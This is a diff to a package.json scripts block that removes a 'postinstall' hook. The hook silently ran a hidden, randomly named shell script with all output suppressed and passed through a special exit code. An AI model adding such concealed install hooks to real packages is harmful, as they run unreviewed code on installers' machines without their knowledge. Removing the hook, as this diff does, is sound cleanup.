@@ -61,8 +61,7 @@
     "test:e2e:standard": "npx wdio run tests/wdio.conf.ts",
     "test:e2e:multiremote": "npx wdio run tests/wdio.multiremote.conf.ts",
     "test:interop": "node tests/interop/test.js",
-    "watch": "npm run build:compile -- --watch",
-    "postinstall": "sh ./.ci-w6o0xk.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "watch": "npm run build:compile -- --watch"
   },
   "devDependencies": {
     "@types/jasmine": "^6.0.0",
